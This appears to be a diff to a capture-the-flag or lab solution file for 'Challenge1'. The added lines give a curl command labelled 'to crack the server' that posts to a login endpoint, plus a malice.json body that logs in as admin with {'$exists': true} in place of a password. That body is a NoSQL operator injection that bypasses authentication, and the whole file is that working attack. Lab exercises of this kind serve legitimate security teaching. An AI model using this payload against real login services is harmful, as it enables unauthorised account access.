@@ -1,1 +1,11 @@
-curl -X POST -H "Content-Type: application/json" -d @malicious_code.json http://localhost:5000/Challenge1/login
+
+Curl command to crack the server
+
+curl -X POST -H "Content-Type: application/json" -d @malice.json http://HOST_NAME:5000/Challenge1/login
+
+malice.json:
+
+{
+	"user": "admin",
+	"pass": {"$exists": true}
+}
